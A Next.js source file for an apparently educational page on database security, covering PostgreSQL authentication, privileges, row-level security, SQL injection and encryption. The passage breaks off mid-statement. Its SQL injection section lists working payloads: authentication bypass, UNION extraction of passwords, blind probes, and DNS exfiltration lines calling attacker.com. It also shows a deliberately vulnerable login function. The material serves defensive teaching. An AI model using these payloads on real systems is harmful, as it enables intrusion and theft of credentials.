import type { Metadata } from 'next'
import { LearnLayout } from '@/components/content/LearnLayout'
import { Callout } from '@/components/content/Callout'
import { KeyTakeaways } from '@/components/content/KeyTakeaways'

export const metadata: Metadata = {
  title: 'Database Security — Complete Guide | DBMS | Chaduvuko',
  description:
    'Complete database security from first principles — authentication, authorisation, SQL injection, privilege management, encryption at rest and in transit, auditing, row-level security, and every interview pattern with real production examples.',
}

const SectionTag = ({ text }: { text: string }) => (
  <div style={{
    fontSize: 10, fontWeight: 700, letterSpacing: '.14em',
    textTransform: 'uppercase', color: 'var(--muted)',
    fontFamily: 'var(--font-mono)', marginBottom: 10,
  }}>{text}</div>
)

const SectionTitle = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{
    fontSize: 'clamp(20px, 2.5vw, 28px)',
    fontWeight: 900, letterSpacing: '-1px',
    color: 'var(--text)', marginBottom: 18,
    fontFamily: 'Syne, sans-serif', lineHeight: 1.2,
  }}>{children}</h2>
)

const SubTitle = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{
    fontSize: 'clamp(16px, 1.8vw, 20px)',
    fontWeight: 700, letterSpacing: '-0.3px',
    color: 'var(--text)', marginBottom: 12,
  }}>{children}</h3>
)

const SubSubTitle = ({ children }: { children: React.ReactNode }) => (
  <h4 style={{
    fontSize: 15, fontWeight: 700,
    color: 'var(--text)', marginBottom: 10,
  }}>{children}</h4>
)

const Para = ({ children }: { children: React.ReactNode }) => (
  <p style={{
    fontSize: 15, color: 'var(--text)',
    lineHeight: 1.9, marginBottom: 20,
  }}>{children}</p>
)

const CodeBox = ({ children, label }: { children: string; label?: string }) => (
  <div style={{ marginBottom: 20 }}>
    {label && (
      <div style={{
        fontSize: 11, fontWeight: 700, color: 'var(--muted)',
        letterSpacing: '.1em', textTransform: 'uppercase',
        marginBottom: 6, fontFamily: 'var(--font-mono)',
      }}>{label}</div>
    )}
    <pre style={{
      background: 'var(--bg2)', border: '1px solid var(--border)',
      borderRadius: 10, padding: '18px 22px', overflowX: 'auto',
      fontSize: 13, lineHeight: 1.9, color: 'var(--text2)',
      fontFamily: 'var(--font-mono)', margin: 0, whiteSpace: 'pre-wrap',
    }}>
      <code>{children}</code>
    </pre>
  </div>
)

export default function DatabaseSecurity() {
  return (
    <LearnLayout
      title="Database Security"
      description="The complete picture of how databases protect data — who gets in, what they can see, how attackers try to break in, how to stop them, and how to prove nothing went wrong."
      section="DBMS"
      readTime="80–95 min"
      updatedAt="March 2026"
    >

      {/* ========================================
          PART 1 — THE SECURITY MODEL
          ======================================== */}
      <section style={{ marginBottom: 72 }}>
        <SectionTag text="// Part 01 — The Security Model" />
        <SectionTitle>The Database Security Model — Three Layers That Must All Hold</SectionTitle>

        <Para>
          Database security is not a single feature — it is a layered system where each
          layer must hold independently. A perfectly configured access control system
          is useless if SQL injection can bypass it entirely. Strong encryption at rest
          is irrelevant if an application-level user can read any row they want.
          Defence in depth means every layer must be correct.
        </Para>

        <div style={{ display: 'flex', flexDirection: 'column', gap: 0, border: '1px solid var(--border)', borderRadius: 12, overflow: 'hidden', marginBottom: 28 }}>
          {[
            {
              layer: '01',
              name: 'Authentication',
              color: '#0078d4',
              question: 'Who are you?',
              mechanisms: 'Passwords, certificates, LDAP/AD, IAM roles, Kerberos, SCRAM-SHA-256',
              breach: 'Stolen credentials, brute force, credential stuffing — attacker gets in as a legitimate user',
              controls: 'Strong password policies, MFA, certificate-based auth, connection limits, IP allowlisting',
            },
            {
              layer: '02',
              name: 'Authorisation',
              color: 'var(--accent)',
              question: 'What are you allowed to do?',
              mechanisms: 'GRANT/REVOKE, roles, row-level security, column-level security, views',
              breach: 'Privilege escalation — authenticated user accesses data or operations beyond their role',
              controls: 'Least-privilege principle, role-based access control, no superuser for app accounts',
            },
            {
              layer: '03',
              name: 'Input Validation',
              color: '#f97316',
              question: 'Is this input safe to execute?',
              mechanisms: 'Prepared statements, parameterised queries, ORM query builders, input sanitisation',
              breach: 'SQL injection — malicious input changes query structure, bypasses authentication and authorisation entirely',
              controls: 'Never concatenate user input into SQL, always use parameterised queries',
            },
            {
              layer: '04',
              name: 'Encryption',
              color: '#8b5cf6',
              question: 'Is data protected if storage is compromised?',
              mechanisms: 'TLS for data in transit, AES-256 for data at rest, column-level encryption, key management',
              breach: 'Physical disk theft, network interception, cloud storage misconfiguration',
              controls: 'TLS everywhere, encrypted storage volumes, customer-managed encryption keys',
            },
            {
              layer: '05',
              name: 'Auditing',
              color: '#facc15',
              question: 'Can we detect and prove what happened?',
              mechanisms: 'Audit logs, query logs, pg_audit extension, database activity monitoring',
              breach: 'Undetected data exfiltration — attacker reads millions of records without any alarm firing',
              controls: 'Log all sensitive table access, alert on anomalous query patterns, immutable audit trail',
            },
          ].map((item, i) => (
            <div key={item.layer} style={{
              display: 'flex', gap: 0,
              borderBottom: i < 4 ? '1px solid var(--border)' : 'none',
            }}>
              <div style={{
                background: `${item.color}10`, borderRight: '1px solid var(--border)',
                padding: '16px 12px', minWidth: 90,
                display: 'flex', flexDirection: 'column',
                alignItems: 'center', justifyContent: 'center', gap: 4,
              }}>
                <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, fontWeight: 700, color: item.color }}>{item.layer}</span>
                <span style={{ fontSize: 12, fontWeight: 800, color: item.color, textAlign: 'center', lineHeight: 1.3 }}>{item.name}</span>
                <span style={{ fontSize: 10, color: 'var(--muted)', textAlign: 'center', lineHeight: 1.3, fontStyle: 'italic' }}>{item.question}</span>
              </div>
              <div style={{ padding: '16px 20px', flex: 1 }}>
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(180px,1fr))', gap: 10 }}>
                  {[
                    ['Mechanisms', item.mechanisms],
                    ['If Breached', item.breach],
                    ['Key Controls', item.controls],
                  ].map(([label, value]) => (
                    <div key={label} style={{ background: 'var(--bg2)', border: '1px solid var(--border)', borderRadius: 7, padding: '8px 12px' }}>
                      <div style={{ fontSize: 10, fontWeight: 700, color: item.color, marginBottom: 4, fontFamily: 'var(--font-mono)', textTransform: 'uppercase', letterSpacing: '.07em' }}>{label}</div>
                      <Para>{value}</Para>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          ))}
        </div>
      </section>

      {/* ========================================
          PART 2 — AUTHENTICATION
          ======================================== */}
      <section style={{ marginBottom: 72 }}>
        <SectionTag text="// Part 02 — Authentication" />
        <SectionTitle>Authentication — Verifying Who Is Connecting to the Database</SectionTitle>

        <Para>
          Database authentication is the process of verifying the identity of a client
          attempting to connect. Every connection to a database must be authenticated.
          The authentication method, configured per connection type in PostgreSQL's
          pg_hba.conf file, determines what credentials are required and how they
          are verified.
        </Para>

        <SubTitle>PostgreSQL Authentication Methods — From Weakest to Strongest</SubTitle>

        <CodeBox label="pg_hba.conf — authentication configuration">
{`# pg_hba.conf (Host-Based Authentication) format:
# TYPE    DATABASE    USER        ADDRESS        METHOD     OPTIONS

# ─────────────────────────────────────────────────────────────────
# TRUST: no password required — NEVER use in production
# ─────────────────────────────────────────────────────────────────
local   all         postgres                   trust
# Any OS user can connect as the postgres superuser with no password
# Appropriate ONLY for local development

# ─────────────────────────────────────────────────────────────────
# MD5: password hashed with MD5 — deprecated, avoid
# ─────────────────────────────────────────────────────────────────
host    all         all         0.0.0.0/0      md5
# MD5 is cryptographically weak — vulnerable to offline dictionary attacks
# Still works but use scram-sha-256 instead

# ─────────────────────────────────────────────────────────────────
# SCRAM-SHA-256: current best practice for password auth
# ─────────────────────────────────────────────────────────────────
host    myapp_db    app_user    10.0.1.0/24    scram-sha-256
# Only the app_user can connect to myapp_db from the 10.0.1.0/24 subnet
# SCRAM-SHA-256: challenge-response — password never sent in plain text
# Even if intercepted, attacker cannot replay the authentication

# ─────────────────────────────────────────────────────────────────
# CERTIFICATE: mutual TLS — strongest password-free method
# ─────────────────────────────────────────────────────────────────
hostssl all         all         0.0.0.0/0      cert
# Client must present a valid TLS certificate signed by the CA
# Used in cloud environments, Kubernetes, machine-to-machine auth
# No password — certificate IS the credential

# ─────────────────────────────────────────────────────────────────
# LDAP / RADIUS: delegate authentication to external directory
# ─────────────────────────────────────────────────────────────────
host    all         all         10.0.0.0/8     ldap
    ldapserver=ldap.company.com
    ldapbasedn="dc=company,dc=com"
    ldapbinddn="cn=postgres,dc=company,dc=com"
    ldapbindpasswd="bind_password"
# Authenticate against Active Directory / LDAP server
# Users' database passwords = their corporate directory passwords
# Single point for user lifecycle management (disable in AD = disable DB access)

# ─────────────────────────────────────────────────────────────────
# PRODUCTION BEST PRACTICES
# ─────────────────────────────────────────────────────────────────
# 1. Never trust connections from any address — always require auth
# 2. Restrict source IP addresses per user/database combination
# 3. Use scram-sha-256 minimum for password auth
# 4. Use SSL/TLS (hostssl) — never allow unencrypted connections in production
# 5. Disable the postgres superuser from remote login:
host    all         postgres    0.0.0.0/0      reject
local   all         postgres                   scram-sha-256`}
        </CodeBox>

        <SubTitle>Connection Security — TLS and SSL Configuration</SubTitle>

        <CodeBox label="TLS configuration — enforce encrypted connections">
{`-- ─────────────────────────────────────────────────────────────────
-- POSTGRESQL TLS SETUP
-- ─────────────────────────────────────────────────────────────────

-- In postgresql.conf:
ssl = on
ssl_cert_file = '/etc/postgresql/server.crt'
ssl_key_file  = '/etc/postgresql/server.key'
ssl_ca_file   = '/etc/postgresql/ca.crt'       -- CA cert for client verification
ssl_ciphers   = 'HIGH:!aNULL:!MD5'            -- strong ciphers only
ssl_min_protocol_version = 'TLSv1.2'           -- reject TLS 1.0 and 1.1

-- Force SSL for all non-local connections in pg_hba.conf:
hostnossl  all  all  0.0.0.0/0  reject    -- reject non-SSL connections
hostssl    all  all  0.0.0.0/0  scram-sha-256  -- require SSL + password

-- VERIFY SSL is being used by a connection:
SELECT ssl, version, cipher, bits, client_dn
FROM pg_stat_ssl
WHERE pid = pg_backend_pid();

-- CONNECTION STRING from application (require SSL):
postgresql://app_user:password@db.example.com:5432/mydb?sslmode=require
-- sslmode options:
-- disable:     never use SSL (dangerous, never in production)
-- allow:       try SSL, fall back to plain
-- prefer:      prefer SSL, fall back to plain (DEFAULT — not safe enough)
-- require:     always use SSL, don't verify certificate
-- verify-ca:   SSL + verify server cert is signed by trusted CA
-- verify-full: SSL + verify cert AND hostname match (MOST SECURE)

-- Production applications: always use sslmode=verify-full with the CA cert
postgresql://app_user:pass@db.company.com/mydb
    ?sslmode=verify-full
    &sslrootcert=/app/certs/ca.crt`}
        </CodeBox>

        <SubTitle>Password Management — Storing Database Credentials Safely</SubTitle>

        <CodeBox label="Password security — hashing, rotation, and secrets management">
{`-- ─────────────────────────────────────────────────────────────────
-- CREATING USERS WITH STRONG PASSWORDS
-- ─────────────────────────────────────────────────────────────────

-- Set password hashing to SCRAM-SHA-256 (do this first):
SET password_encryption = 'scram-sha-256';

-- Create application user with strong password:
CREATE USER app_user
    PASSWORD 'do-not-hardcode-use-secrets-manager'
    CONNECTION LIMIT 50   -- max 50 simultaneous connections
    VALID UNTIL '2025-01-01';  -- force password rotation

-- Rotate a password (application briefly uses new password):
ALTER USER app_user PASSWORD 'new-strong-password-from-vault';

-- ─────────────────────────────────────────────────────────────────
-- SECRETS MANAGEMENT — never hardcode passwords
-- ─────────────────────────────────────────────────────────────────

-- BAD: password in application code or config file
DATABASE_URL="postgresql://app:hardcoded_password@db:5432/mydb"
# If this repo is ever public or leaked: database is compromised

-- GOOD: AWS Secrets Manager
import boto3, json
def get_db_password():
    client = boto3.client('secretsmanager', region_name='ap-south-1')
    secret = client.get_secret_value(SecretId='prod/db/app_user')
    return json.loads(secret['SecretString'])['password']

-- GOOD: HashiCorp Vault
vault kv get secret/prod/database/app_user
# Application uses Vault agent to auto-rotate credentials

-- GOOD: Kubernetes Secrets (base64 encoded, mounted as env vars)
kubectl create secret generic db-creds \
    --from-literal=password='$(vault read -field=password secret/db)'

-- AUTOMATIC ROTATION (AWS RDS + Secrets Manager):
-- Secrets Manager can automatically rotate the RDS password on a schedule
-- Application fetches the secret on each connection attempt
-- Zero-downtime rotation: new password written before old is invalidated`}
        </CodeBox>
      </section>

      {/* ========================================
          PART 3 — AUTHORISATION AND PRIVILEGES
          ======================================== */}
      <section style={{ marginBottom: 72 }}>
        <SectionTag text="// Part 03 — Authorisation" />
        <SectionTitle>Authorisation — Controlling What Authenticated Users Can Do</SectionTitle>

        <Para>
          Once a user is authenticated, authorisation determines exactly what they
          are permitted to do. PostgreSQL's privilege system follows the
          <strong style={{ color: 'var(--accent)' }}> principle of least privilege</strong>:
          every user should have access to exactly what they need to do their job,
          and nothing more. This limits the blast radius of a compromised account —
          an attacker who steals the application's database credentials can only do
          what the application is allowed to do.
        </Para>

        <SubTitle>The PostgreSQL Privilege Hierarchy</SubTitle>

        <CodeBox label="GRANT and REVOKE — the complete privilege system">
{`-- ─────────────────────────────────────────────────────────────────
-- PRIVILEGE TYPES
-- ─────────────────────────────────────────────────────────────────
-- On tables/views:
-- SELECT, INSERT, UPDATE, DELETE, TRUNCATE, REFERENCES, TRIGGER

-- On schemas:
-- USAGE (can see objects in schema), CREATE (can create objects)

-- On databases:
-- CONNECT, CREATE, TEMP

-- On sequences:
-- USAGE, SELECT, UPDATE

-- On functions:
-- EXECUTE

-- ─────────────────────────────────────────────────────────────────
-- ROLE-BASED ACCESS CONTROL (RBAC) — group privileges into roles
-- ─────────────────────────────────────────────────────────────────

-- Step 1: Create roles (groups of privileges):
CREATE ROLE readonly_role;
CREATE ROLE app_role;
CREATE ROLE analytics_role;
CREATE ROLE dba_role;

-- Step 2: Grant privileges to roles:

-- readonly_role: can only SELECT
GRANT USAGE ON SCHEMA public TO readonly_role;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO readonly_role;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT SELECT ON TABLES TO readonly_role;
-- "ALTER DEFAULT PRIVILEGES" applies to FUTURE tables too — critical

-- app_role: application needs SELECT, INSERT, UPDATE, DELETE (no DROP, no TRUNCATE)
GRANT USAGE ON SCHEMA public TO app_role;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_role;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO app_role;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO app_role;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT USAGE, SELECT ON SEQUENCES TO app_role;

-- analytics_role: can SELECT everything, can create temp tables
GRANT USAGE ON SCHEMA public TO analytics_role;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO analytics_role;
GRANT CREATE ON SCHEMA analytics_scratch TO analytics_role;
-- analytics users get their own schema for scratch work

-- Step 3: Create users and assign roles:
CREATE USER app_server      LOGIN PASSWORD '...' IN ROLE app_role;
CREATE USER report_user     LOGIN PASSWORD '...' IN ROLE readonly_role;
CREATE USER data_analyst_01 LOGIN PASSWORD '...' IN ROLE analytics_role;

-- Step 4: Revoke dangerous defaults (PostgreSQL grants PUBLIC schema CREATE by default):
REVOKE CREATE ON SCHEMA public FROM PUBLIC;
-- Without this: any authenticated user can create tables in the public schema!
REVOKE ALL ON DATABASE myapp FROM PUBLIC;
GRANT CONNECT ON DATABASE myapp TO app_role, analytics_role, readonly_role;

-- ─────────────────────────────────────────────────────────────────
-- CHECKING CURRENT PRIVILEGES
-- ─────────────────────────────────────────────────────────────────
-- List all table privileges:
SELECT grantee, table_name, privilege_type
FROM information_schema.role_table_grants
WHERE table_schema = 'public'
ORDER BY grantee, table_name;

-- Check what a specific user can do:
\dp orders   -- in psql: list privileges on the orders table

-- Check role memberships:
SELECT r.rolname, m.rolname AS member_of
FROM pg_roles r
JOIN pg_auth_members am ON r.oid = am.member
JOIN pg_roles m ON am.roleid = m.oid
ORDER BY r.rolname;`}
        </CodeBox>

        <SubTitle>Row-Level Security (RLS) — The Most Powerful Access Control Tool</SubTitle>

        <Para>
          Row-Level Security allows you to define policies that automatically filter
          which rows a user can see or modify — without any application code changes.
          Every query on an RLS-enabled table automatically has the policy's condition
          appended, as if it were a WHERE clause, regardless of how the query was
          written. This is enforced at the database engine level — it cannot be
          bypassed by SQL injection or query manipulation.
        </Para>

        <CodeBox label="Row-Level Security — complete implementation">
{`-- ─────────────────────────────────────────────────────────────────
-- USE CASE: multi-tenant SaaS — each tenant sees only their data
-- ─────────────────────────────────────────────────────────────────

-- 1. Add tenant_id to every table:
ALTER TABLE orders    ADD COLUMN tenant_id INT NOT NULL;
ALTER TABLE customers ADD COLUMN tenant_id INT NOT NULL;
ALTER TABLE products  ADD COLUMN tenant_id INT NOT NULL;

-- 2. Enable RLS on each table:
ALTER TABLE orders    ENABLE ROW LEVEL SECURITY;
ALTER TABLE customers ENABLE ROW LEVEL SECURITY;
ALTER TABLE products  ENABLE ROW LEVEL SECURITY;

-- 3. Create policies:
-- POLICY FOR SELECT: tenant can only see their own rows
CREATE POLICY tenant_isolation_orders
ON orders
FOR SELECT
USING (tenant_id = current_setting('app.tenant_id')::INT);

-- POLICY FOR INSERT: tenant can only insert rows for themselves
CREATE POLICY tenant_insert_orders
ON orders
FOR INSERT
WITH CHECK (tenant_id = current_setting('app.tenant_id')::INT);

-- POLICY FOR UPDATE: tenant can only update their own rows
CREATE POLICY tenant_update_orders
ON orders
FOR UPDATE
USING (tenant_id = current_setting('app.tenant_id')::INT)
WITH CHECK (tenant_id = current_setting('app.tenant_id')::INT);
-- USING: which rows can be seen/targeted
-- WITH CHECK: what the row must satisfy after the update

-- 4. Application sets tenant context on every connection:
-- In Python (psycopg2):
cursor.execute("SET LOCAL app.tenant_id = %s", (tenant_id,))
-- SET LOCAL: applies only for the current transaction
-- SET (without LOCAL): applies for entire session

-- 5. Test the policy:
SET app.tenant_id = 42;
SELECT * FROM orders;
-- Automatically returns: SELECT * FROM orders WHERE tenant_id = 42
-- No WHERE clause needed in application code — enforced by the database

-- ─────────────────────────────────────────────────────────────────
-- BYPASS RLS: superusers and table owners bypass RLS by default
-- ─────────────────────────────────────────────────────────────────
-- Force RLS even for the table owner:
ALTER TABLE orders FORCE ROW LEVEL SECURITY;

-- A role can bypass RLS if granted BYPASSRLS:
ALTER ROLE dba_role BYPASSRLS;
-- Use sparingly — only for actual DBAs, not application accounts

-- ─────────────────────────────────────────────────────────────────
-- COLUMN-LEVEL SECURITY via views + privileges
-- ─────────────────────────────────────────────────────────────────
-- Hide salary and SSN last 4 from most users:
CREATE VIEW employees_public AS
SELECT employee_id, name, department, title, hire_date
FROM employees;
-- Do NOT grant SELECT on employees directly; grant on employees_public:
GRANT SELECT ON employees_public TO readonly_role;
REVOKE ALL    ON employees        FROM readonly_role;

-- Column-level GRANT (alternative to views):
GRANT SELECT (employee_id, name, department) ON employees TO readonly_role;
-- readonly_role can only select those three columns
-- SELECT * FROM employees will fail; SELECT employee_id, name FROM employees works`}
        </CodeBox>
      </section>

      {/* ========================================
          PART 4 — SQL INJECTION
          ======================================== */}
      <section style={{ marginBottom: 72 }}>
        <SectionTag text="// Part 04 — SQL Injection" />
        <SectionTitle>SQL Injection — The Most Dangerous Database Vulnerability</SectionTitle>

        <Para>
          SQL injection is consistently ranked the number one web application security
          vulnerability (OWASP Top 10). It occurs when user-supplied input is
          concatenated directly into a SQL query string — allowing the attacker to
          inject arbitrary SQL code that changes the semantics of the query.
          A successful SQL injection attack can bypass authentication entirely,
          read any data from the database, modify or delete data, and in some
          configurations execute operating system commands.
        </Para>

        <Para>
          SQL injection is entirely preventable with parameterised queries.
          Every SQL injection attack in history could have been prevented by
          using prepared statements instead of string concatenation.
          This makes it one of the most frustrating categories of vulnerability —
          it exists purely because developers chose a dangerous coding pattern.
        </Para>

        <SubTitle>How SQL Injection Works — Complete Attack Taxonomy</SubTitle>

        <CodeBox label="SQL injection attack types — every variant with examples">
{`// ─────────────────────────────────────────────────────────────────
// CLASSIC IN-BAND SQL INJECTION (results returned directly)
// ─────────────────────────────────────────────────────────────────

// VULNERABLE login query (Python — NEVER DO THIS):
def login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    result = db.execute(query)
    return result.fetchone() is not None

// ATTACK 1: Authentication bypass
// username = admin'--
// password = anything
// Resulting query:
// SELECT * FROM users WHERE username='admin'--' AND password='anything'
// The -- comments out the password check entirely
// Returns the admin row → attacker is logged in as admin

// ATTACK 2: Always-true injection
// username = ' OR '1'='1
// Resulting query:
// SELECT * FROM users WHERE username='' OR '1'='1' AND password='...'
// '1'='1' is always true → returns ALL users → attacker logged in as first user

// ─────────────────────────────────────────────────────────────────
// UNION-BASED INJECTION (extract data from other tables)
// ─────────────────────────────────────────────────────────────────

// Vulnerable product search:
query = f"SELECT name, price FROM products WHERE category='{category}'"

// ATTACK: inject UNION to read from users table
// category = "phones' UNION SELECT username, password FROM users--"
// Resulting query:
// SELECT name, price FROM products WHERE category='phones'
// UNION SELECT username, password FROM users--'
// Returns product names AND usernames/passwords combined
// Attacker now has all usernames and password hashes

// ─────────────────────────────────────────────────────────────────
// BLIND SQL INJECTION (no results returned — attacker infers from behaviour)
// ─────────────────────────────────────────────────────────────────

// Boolean-based blind: server responds differently for true/false conditions
// URL: /user?id=1 AND 1=1      (true → page loads normally)
// URL: /user?id=1 AND 1=2      (false → page shows error or blank)
// Attacker builds queries bit by bit:
// /user?id=1 AND ASCII(SUBSTRING(password,1,1)) > 64   (first char > 'A'?)
// /user?id=1 AND ASCII(SUBSTRING(password,1,1)) > 96   (first char > 'a'?)
// → Extracts the entire database character by character

// Time-based blind: server delays response for true conditions
// /user?id=1; IF (1=1) WAITFOR DELAY '0:0:5'--  (SQL Server)
// /user?id=1 AND (SELECT SLEEP(5) FROM users WHERE username='admin')--  (MySQL)
// 5-second delay → confirms condition is true → extract data bit by bit

// ─────────────────────────────────────────────────────────────────
// SECOND-ORDER INJECTION (stored and executed later)
// ─────────────────────────────────────────────────────────────────

// Input is safely stored but unsafely used later:
// Step 1: Register username "admin'--" (stored safely with escaping)
// Step 2: Change password feature uses stored username in a new query:
//   query = f"UPDATE users SET password='{new_pass}' WHERE username='{stored_username}'"
// The stored username is retrieved from DB and concatenated WITHOUT escaping
// Resulting: UPDATE users SET password='...' WHERE username='admin'--'
// Password of admin account is changed by a regular user

// ─────────────────────────────────────────────────────────────────
// OUT-OF-BAND INJECTION (exfiltrate via DNS or HTTP)
// ─────────────────────────────────────────────────────────────────
// When results cannot be read directly and delays are blocked:
// MySQL:
//   SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'))
// SQL Server:
//   EXEC xp_dirtree '\\' + (SELECT TOP 1 password FROM users) + '.attacker.com\a'
// The database makes a DNS lookup to attacker.com with the stolen data as a subdomain
// Attacker reads their DNS logs to get the data`}
        </CodeBox>

        <SubTitle>Prevention — Parameterised Queries Are the Only Real Fix</SubTitle>

        <CodeBox label="SQL injection prevention — correct patterns in every language">
{`// ─────────────────────────────────────────────────────────────────
// THE FUNDAMENTAL FIX: PARAMETERISED QUERIES (PREPARED STATEMENTS)
// ─────────────────────────────────────────────────────────────────
// Parameterised queries send the SQL structure and the data SEPARATELY.
// The database engine NEVER interprets the parameter as SQL code.
// Even if the parameter contains SQL syntax, it is treated as a literal string.

// PYTHON (psycopg2) — CORRECT:
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)   # parameters passed separately — cannot change query structure
)

// PYTHON (psycopg2) — WRONG:
cursor.execute(f"SELECT * FROM users WHERE username='{username}'")  # NEVER

// JAVA (JDBC PreparedStatement) — CORRECT:
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?"
);
stmt.setString(1, username);  // parameter 1
stmt.setString(2, password);  // parameter 2
ResultSet rs = stmt.executeQuery();

// NODE.JS (pg library) — CORRECT:
const result = await client.query(
    'SELECT * FROM users WHERE username = $1 AND password = $2',
    [username, password]
);

// PHP (PDO) — CORRECT:
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$username, $password]);

// DJANGO ORM — CORRECT (ORM handles parameterisation automatically):
User.objects.filter(username=username, password=password)
# Django ORM always uses parameterised queries under the hood

// SQLALCHEMY (Python ORM) — CORRECT:
session.query(User).filter_by(username=username, password=password).first()
# Always parameterised. Use text() with bindparams for raw SQL:
from sqlalchemy import text
session.execute(
    text("SELECT * FROM users WHERE username = :user"),
    {"user": username}
)

// ─────────────────────────────────────────────────────────────────
// DYNAMIC TABLE/COLUMN NAMES (cannot be parameterised — different solution)
// ─────────────────────────────────────────────────────────────────
// Parameters work for VALUES, not for identifiers (table names, column names)
// If you must build dynamic SQL with identifiers:

// PYTHON — use allowlist validation:
ALLOWED_SORT_COLUMNS = {'name', 'price', 'date', 'rating'}
if sort_column not in ALLOWED_SORT_COLUMNS:
    raise ValueError(f"Invalid sort column: {sort_column}")
query = f"SELECT * FROM products ORDER BY {sort_column}"
# Safe because we validated against an allowlist before using in SQL

// POSTGRESQL — use quote_ident() for dynamic identifiers in PL/pgSQL:
EXECUTE format('SELECT * FROM %I ORDER BY %I', table_name, col_name);
-- %I: quotes the identifier properly, prevents injection
-- %L: quotes a literal value

// ─────────────────────────────────────────────────────────────────
// STORED PROCEDURES — do they prevent injection?
// ─────────────────────────────────────────────────────────────────
-- ONLY if they use parameterised queries internally:

-- SAFE stored procedure:
CREATE FUNCTION get_user(p_username TEXT) RETURNS SETOF users AS $$
BEGIN
    RETURN QUERY SELECT * FROM users WHERE username = p_username;
    -- p_username is a parameter — cannot change query structure
END;
$$ LANGUAGE plpgsql;

-- UNSAFE stored procedure (dynamic SQL without parameterisation):
CREATE FUNCTION get_user_unsafe(p_username TEXT) RETURNS SETOF users AS $$
BEGIN
    EXECUTE 'SELECT * FROM users WHERE username = ''' || p_username || '''';
    -- String concatenation inside stored procedure = still injectable!
END;
$$ LANGUAGE plpgsql; -- NEVER DO THIS`}
        </CodeBox>

        <SubTitle>Defence in Depth — Additional Layers Beyond Parameterisation</SubTitle>

        <div style={{ display: 'flex', flexDirection: 'column', gap: 12, marginBottom: 24 }}>
          {[
            {
              control: 'Least Privilege for the Application Account',
              color: 'var(--accent)',
              detail: 'The application database user should have only SELECT, INSERT, UPDATE, DELETE on the specific tables it needs. No DROP, no ALTER, no TRUNCATE, no CREATE. If SQL injection achieves code execution as this user, the attacker can only do what the application can do — they cannot drop tables, create backdoor accounts, or access system tables.',
            },
            {
              control: 'Web Application Firewall (WAF)',
              color: '#0078d4',
              detail: 'A WAF inspects HTTP requests for SQL injection patterns before they reach the application. Not a replacement for parameterised queries — a skilled attacker can encode payloads to bypass WAF rules. But a WAF stops automated scanners and opportunistic attacks, and provides detection and alerting when injection attempts are occurring.',
            },
            {
              control: 'Input Validation and Type Enforcement',
              color: '#f97316',
              detail: 'If a field expects an integer (user_id), reject anything that is not a valid integer at the application layer before it ever reaches the database layer. Type-safe ORMs enforce this automatically. Defence in depth: even if your parameterisation has a bug, a non-integer value like "1 OR 1=1" cannot be cast to an integer and is rejected.',
            },
            {
              control: 'Error Message Sanitisation',
              color: '#8b5cf6',
              detail: 'Database error messages reveal schema information — table names, column names, data types. An attacker who gets an error message from an injection attempt learns the structure of your database. Never return raw database errors to clients. Log them server-side, return generic "something went wrong" messages to users.',
            },
          ].map((item) => (
            <div key={item.control} style={{ background: 'var(--surface)', border: `1px solid ${item.color}30`, borderLeft: `4px solid ${item.color}`, borderRadius: 10, padding: '16px 20px' }}>
              <div style={{ fontSize: 13, fontWeight: 700, color: 'var(--text)', marginBottom: 8 }}>{item.control}</div>
              <Para>{item.detail}</Para>
            </div>
          ))}
        </div>
      </section>

      {/* ========================================
          PART 5 — ENCRYPTION
          ======================================== */}
      <section style={{ marginBottom: 72 }}>
        <SectionTag text="// Part 05 — Encryption" />
        <SectionTitle>Encryption — Protecting Data at Rest and in Transit</SectionTitle>

        <Para>
          Encryption protects data against attackers who have physical or storage-level
          access — someone who steals a hard drive, gains read access to S3 buckets,
          or intercepts network traffic. It is the last line of defence after all
          access controls have been bypassed.
        </Para>

        <SubTitle>Encryption at Rest — Protecting Stored Data</SubTitle>

        <CodeBox label="Encryption at rest — levels and implementation">
{`// ─────────────────────────────────────────────────────────────────
// LEVEL 1: FULL DISK ENCRYPTION (OS-level)
// ─────────────────────────────────────────────────────────────────
// Linux LUKS, AWS EBS encryption, Azure Disk Encryption
// Entire disk is encrypted with AES-256
// Transparent to the database — no configuration needed
// Protects against: physical disk theft
// Does NOT protect against: running OS access, compromised application

// AWS RDS: enable encryption at creation time
aws rds create-db-instance \
    --db-instance-identifier prod-postgres \
    --storage-encrypted \
    --kms-key-id arn:aws:kms:ap-south-1:123456:key/abc-def
-- Cannot enable encryption on existing unencrypted RDS instance
-- Must snapshot + restore to encrypted instance

// ─────────────────────────────────────────────────────────────────
// LEVEL 2: TABLESPACE-LEVEL ENCRYPTION (PostgreSQL TDE — extension)
// ─────────────────────────────────────────────────────────────────
-- Native transparent data encryption via pg_tde extension (PostgreSQL 17+)
-- Encrypts individual tables/tablespaces at the storage level
-- Protects against: stolen data files, backup file access
-- Does NOT protect against: queries executed as a legitimate user

-- ─────────────────────────────────────────────────────────────────
-- LEVEL 3: COLUMN-LEVEL ENCRYPTION (pgcrypto)
-- ─────────────────────────────────────────────────────────────────
-- Encrypt specific sensitive columns within the database
-- Even a DBA with full PostgreSQL access cannot read plaintext values
-- Protects against: insider threats, compromised DBA account

CREATE EXTENSION pgcrypto;

-- Encrypt on insert (using symmetric encryption with application-managed key):
INSERT INTO customers (name, email, ssn_last4, bank_account)
VALUES (
    'Rahul Sharma',
    'rahul@email.com',
    pgp_sym_encrypt('ABCDE1234F', 'encryption_key_from_vault'),
